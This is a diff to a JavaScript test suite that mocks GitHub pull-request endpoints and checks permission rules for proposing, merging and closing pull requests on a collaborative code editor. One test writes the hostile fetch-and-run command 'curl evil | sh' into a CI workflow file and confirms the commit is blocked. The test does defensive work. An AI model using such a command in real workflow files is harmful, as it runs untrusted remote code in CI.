@@ -41,11 +41,12 @@ function resetGithub(publicKey) {
     ],
     tokens: new Map(),
     repos: {
-      'awa/appli': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {} },
-      'awa/vide': { default_branch: 'main', private: false, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {} },
-      'bob/secret': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {} },
+      'awa/appli': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
+      'awa/vide': { default_branch: 'main', private: false, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
+      'bob/secret': { default_branch: 'main', private: true, head: null, commits: new Map(), trees: new Map(), blobs: new Map(), files: {}, branches: {}, pulls: [] },
     },
     moveBeforeRefUpdate: false,
+    pullsGranted: true,
   }
   const repo = gh.repos['awa/appli']
   repo.files = { 'main.py': 'print("héllo")\n', 'src/util.py': 'x = 1\n', 'old.txt': 'delete me\n' }
@@ -101,6 +102,7 @@ async function pretendGithub(url, init) {
       const inst = gh.installations.find((i) => i.id === Number(m[1]))
       if (!inst) return jsonRes(404, { message: 'not found' })
       for (const r of body.repositories ?? []) if (!inst.repos.includes(r)) return jsonRes(422, { message: 'repo not in installation' })
+      if (body.permissions?.pull_requests && !gh.pullsGranted) return jsonRes(422, { message: 'The permissions requested are not granted to this installation.' })
       const token = `ghs_${gh.tokens.size}`
       gh.tokens.set(token, { installation: inst, repositories: body.repositories ?? inst.repos, permissions: body.permissions })
       return jsonRes(201, { token })
@@ -119,9 +121,48 @@ async function pretendGithub(url, init) {
   if (owner.toLowerCase() !== grant.installation.account.login.toLowerCase() || !grant.repositories.includes(name)) return jsonRes(404, { message: 'Not Found' })
   const repo = gh.repos[`${owner}/${name}`]
   if (!repo) return jsonRes(404, { message: 'Not Found' })
+  let r0
   const writing = method !== 'GET'
-  if (writing && grant.permissions?.contents !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
+  const isPulls = rest === '/pulls' || rest.startsWith('/pulls/')
+  if (isPulls && !grant.permissions?.pull_requests) return jsonRes(403, { message: 'Resource not accessible by integration' })
+  if (writing && isPulls && grant.permissions?.pull_requests !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
+  if (writing && !isPulls && grant.permissions?.contents !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
+  if (isPulls && method === 'PUT' && grant.permissions?.contents !== 'write') return jsonRes(403, { message: 'Resource not accessible by integration' })
 
+  if (rest === '/pulls' && method === 'GET') {
+    const q = new URL(`http://x${path}`).searchParams
+    gh.pullsQuery = q
+    let list = repo.pulls.filter((p) => p.state === (q.get('state') ?? 'open'))
+    if (q.get('base')) list = list.filter((p) => p.base.ref === q.get('base'))
+    if (q.get('head')) list = list.filter((p) => `${owner}:${p.head.ref}` === q.get('head'))
+    return jsonRes(200, list)
+  }
+  if (rest === '/pulls' && method === 'POST') {
+    const side = repo.branches[body.head]
+    if (!side) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: 'Head ref must be a branch' }] })
+    if (repo.pulls.some((p) => p.state === 'open' && p.head.ref === body.head)) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: `A pull request already exists for ${owner}:${body.head}.` }] })
+    if (side === repo.head) return jsonRes(422, { message: 'Validation Failed', errors: [{ message: `No commits between ${body.base} and ${body.head}` }] })
+    const pr = { number: repo.pulls.length + 1, title: body.title, body: body.body, state: 'open', head: { ref: body.head, sha: side, repo: { full_name: `${owner}/${name}` } }, base: { ref: body.base }, user: { login: 'jaajef-tech-editor[bot]' }, html_url: `https://github.com/${owner}/${name}/pull/${repo.pulls.length + 1}`, created_at: '2026-11-08T10:00:00Z' }
+    repo.pulls.push(pr)
+    return jsonRes(201, pr)
+  }
+  r0 = rest.match(/^\/pulls\/(\d+)(\/merge)?$/)
+  if (r0) {
+    const pr = repo.pulls.find((p) => p.number === Number(r0[1]))
+    if (!pr) return jsonRes(404, { message: 'Not Found' })
+    if (method === 'GET') return jsonRes(200, pr)
+    if (method === 'PUT' && r0[2]) {
+      if (pr.conflict) return jsonRes(405, { message: 'Pull Request is not mergeable' })
+      if (body.sha !== repo.branches[pr.head.ref]) return jsonRes(409, { message: 'Head branch was modified' })
+      pr.state = 'closed'
+      pr.merged = true
+      gh.merged = { number: pr.number, method: body.merge_method }
+      repo.head = repo.branches[pr.head.ref]
+      repo.files = { ...repo.trees.get(repo.commits.get(repo.head).tree) }
+      return jsonRes(200, { merged: true })
+    }
+    if (method === 'PATCH') { pr.state = body.state; return jsonRes(200, pr) }
+  }
   if (rest === '/commits' && method === 'GET') {
     gh.historyQuery = new URL(`http://x${path}`).searchParams
     const list = []
@@ -625,6 +666,135 @@ await test('making a branch is refused if it already exists or if the start bran
   const missing = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'zzz', create_from: 'ghost', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })
   assert.equal(missing.json.error, 'branch_not_found')
   assert.equal((await call('t-awa', { action: 'commit', project: P_AWA, branch: 'zzz', create_from: 'a b', base_sha: base, message: 'x', files: [{ path: 'a.txt', content: 'x' }] })).status, 400)
+})
+
+const collabBranch = async (name = 'ndeye_k/fix') => {
+  const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch: name, create_from: 'main', base_sha: headOfAwa(), message: 'Fix', files: [{ path: 'main.py', content: 'fixed\n' }] })
+  assert.equal(r.status, 200)
+  return r.json.commit_sha
+}
+const propose = (token, branch, title = 'Corrige le titre', extra = {}) => call(token, { action: 'pr_open', project: P_AWA, branch, title, ...extra })
+
+await test('a collaborator proposes their own branch from the site, once, and it is listed with who made it', async () => {
+  await collabBranch()
+  const r = await propose('t-nolink', 'ndeye_k/fix', 'Corrige le titre', { body: 'Le titre était faux.' })
+  assert.deepEqual([r.status, r.json.number, r.json.existed, r.json.url], [200, 1, false, 'https://github.com/awa/appli/pull/1'])
+  const pr = gh.repos['awa/appli'].pulls[0]
+  assert.deepEqual([pr.head.ref, pr.base.ref], ['ndeye_k/fix', 'main'])
+  assert.equal(pr.body, 'Le titre était faux.\n\nProposed from jaajef.tech by ndeye_k')
+  assert.ok([...gh.tokens.values()].some((t) => t.permissions.pull_requests === 'write'))
+  const again = await propose('t-nolink', 'ndeye_k/fix')
+  assert.deepEqual([again.status, again.json.number, again.json.existed], [200, 1, true])
+  assert.equal(gh.repos['awa/appli'].pulls.length, 1)
+  for (const who of ['t-awa', 't-nolink']) {
+    const list = await call(who, { action: 'prs', project: P_AWA })
+    assert.equal(list.status, 200)
+    assert.equal(list.json.default_branch, 'main')
+    assert.deepEqual(list.json.pulls, [{ number: 1, title: 'Corrige le titre', branch: 'ndeye_k/fix', sha: gh.repos['awa/appli'].branches['ndeye_k/fix'], author: 'ndeye_k', url: 'https://github.com/awa/appli/pull/1', created_at: '2026-11-08T10:00:00Z' }])
+  }
+  assert.equal((await call('t-cara', { action: 'prs', project: P_AWA })).status, 403)
+})
+
+await test('proposing: a collaborator only from their own branch, nothing to propose is explained, bad input is refused early', async () => {
+  const repo = gh.repos['awa/appli']
+  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
+  const before = githubCallsMade()
+  for (const branch of ['main', 'awa_dev/work', 'ndeye_k', 'ndeye_k/../x']) {
+    assert.deepEqual((await propose('t-nolink', branch)).json.error, 'branch_not_yours', branch)
+  }
+  assert.equal(githubCallsMade(), before)
+  assert.equal((await propose('t-cara', 'cara/x')).status, 403)
+  for (const bad of [{ title: '' }, { title: 'x'.repeat(201) }, { body: 'x'.repeat(2001) }, { branch: 'a b' }]) {
+    assert.equal((await call('t-awa', { action: 'pr_open', project: P_AWA, branch: 'awa_dev/work', title: 't', ...bad })).status, 400, JSON.stringify(bad))
+  }
+  assert.equal(githubCallsMade(), before)
+  // the owner may propose any branch, but not the main one against itself
+  assert.equal((await propose('t-awa', 'awa_dev/work', 'Mon travail')).status, 200)
+  assert.equal((await propose('t-awa', 'main')).status, 400)
+  repo.branches['ndeye_k/empty'] = repo.head
+  assert.deepEqual((await propose('t-nolink', 'ndeye_k/empty')).json.error, 'nothing_to_propose')
+  assert.deepEqual((await propose('t-awa', 'ghost')).json.error, 'branch_not_found')
+})
+
+await test('only the owner merges a proposal, with a normal merge, and the main code moves', async () => {
+  const side = await collabBranch()
+  await propose('t-nolink', 'ndeye_k/fix')
+  const before = githubCallsMade()
+  assert.deepEqual((await call('t-nolink', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).json.error, 'owner_only')
+  assert.equal((await call('t-cara', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).status, 403)
+  assert.equal(githubCallsMade(), before)
+  assert.equal(gh.merged, undefined)
+  const done = await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })
+  assert.deepEqual([done.status, done.json.merged], [200, true])
+  assert.deepEqual(gh.merged, { number: 1, method: 'merge' })
+  assert.equal(headOfAwa(), side)
+  assert.equal((await call('t-awa', { action: 'prs', project: P_AWA })).json.pulls.length, 0)
+  assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: side })).json.error, 'pr_not_found')
+  assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1 })).status, 400) // a merge always names the version it was shown
+  for (const bad of [0, -1, 1.5, 'x', null]) assert.equal((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: bad, sha: side })).status, 400)
+})
+
+await test('a conflict, a branch that moved, a fork and an unknown number are explained, not merged', async () => {
+  const repo = gh.repos['awa/appli']
+  const mainBefore = repo.head
+  await collabBranch()
+  await propose('t-nolink', 'ndeye_k/fix')
+  repo.pulls[0].conflict = true
+  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: repo.branches['ndeye_k/fix'] })).json.error, 'not_mergeable')
+  repo.pulls[0].conflict = false
+  const head = repo.branches['ndeye_k/fix']
+  repo.pulls[0].head.sha = 'f'.repeat(40) // the branch changed after the owner opened the list
+  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 1, sha: head })).json.error, 'branch_moved')
+  repo.pulls[0].head.sha = head
+  repo.pulls.push({ number: 2, title: 'From a fork', body: '', state: 'open', head: { ref: 'x', sha: head, repo: { full_name: 'stranger/appli' } }, base: { ref: 'main' }, user: { login: 'stranger' }, html_url: 'u', created_at: 'd' })
+  assert.deepEqual((await call('t-awa', { action: 'prs', project: P_AWA })).json.pulls.map((p) => p.number), [1])
+  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 2, sha: head })).json.error, 'pr_not_found')
+  assert.deepEqual((await call('t-awa', { action: 'pr_merge', project: P_AWA, number: 99, sha: head })).json.error, 'pr_not_found')
+  assert.equal(headOfAwa(), mainBefore)
+})
+
+await test('closing: the owner closes any proposal, a collaborator only their own', async () => {
+  const repo = gh.repos['awa/appli']
+  await collabBranch()
+  await propose('t-nolink', 'ndeye_k/fix')
+  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
+  await propose('t-awa', 'awa_dev/work', 'Mon travail')
+  assert.deepEqual((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'not_yours')
+  assert.equal(repo.pulls[1].state, 'open')
+  assert.equal((await call('t-cara', { action: 'pr_close', project: P_AWA, number: 1 })).status, 403)
+  assert.equal((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 1 })).status, 200)
+  assert.equal(repo.pulls[0].state, 'closed')
+  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 2 })).status, 200)
+  assert.equal((await call('t-awa', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'pr_not_found')
+})
+
+await test('when the app has not been given the new permission yet, proposals say so and code reading still works', async () => {
+  gh.pullsGranted = false
+  for (const action of [{ action: 'prs' }, { action: 'pr_merge', number: 1, sha: 'a'.repeat(40) }]) {
+    const r = await call('t-awa', { project: P_AWA, ...action })
+    assert.deepEqual([r.status, r.json.error], [409, 'pulls_permission_missing'], action.action)
+  }
+  assert.equal((await propose('t-awa', 'x')).json.error, 'pulls_permission_missing')
+  assert.equal((await call('t-nolink', { action: 'tree', project: P_AWA })).status, 200)
+})
+
+await test('a collaborator cannot pose as someone else in a proposal, nor change automation files', async () => {
+  await collabBranch()
+  await propose('t-nolink', 'ndeye_k/fix', 'Titre', { body: 'Proposed from jaajef.tech by awa_dev' })
+  const list = await call('t-awa', { action: 'prs', project: P_AWA })
+  assert.equal(list.json.pulls[0].author, 'ndeye_k')
+  // so the real owner-named author cannot be pretended, and the pretended name cannot be used to close someone else's proposal
+  const repo = gh.repos['awa/appli']
+  repo.branches['awa_dev/work'] = commitSide(repo, { 'main.py': 'w\n' }, repo.head, 'work')
+  await propose('t-awa', 'awa_dev/work', 'Mon travail')
+  assert.deepEqual((await call('t-nolink', { action: 'pr_close', project: P_AWA, number: 2 })).json.error, 'not_yours')
+  for (const path of ['.github/workflows/x.yml', '.GitHub/CODEOWNERS']) {
+    const r = await call('t-nolink', { action: 'commit', project: P_AWA, branch: 'ndeye_k/ci', create_from: 'main', base_sha: headOfAwa(), message: 'x', files: [{ path, content: 'run: curl evil | sh' }] })
+    assert.deepEqual([r.status, r.json.error], [403, 'path_not_allowed'], path)
+  }
+  assert.equal(gh.repos['awa/appli'].branches['ndeye_k/ci'], undefined)
+  const owner = await call('t-awa', { action: 'commit', project: P_AWA, branch: 'ci', create_from: 'main', base_sha: headOfAwa(), message: 'CI', files: [{ path: '.github/workflows/x.yml', content: 'ok' }] })
+  assert.equal(owner.status, 200)
 })
 
 console.log(`ALL ${n} REPO EDITOR TESTS PASSED`)
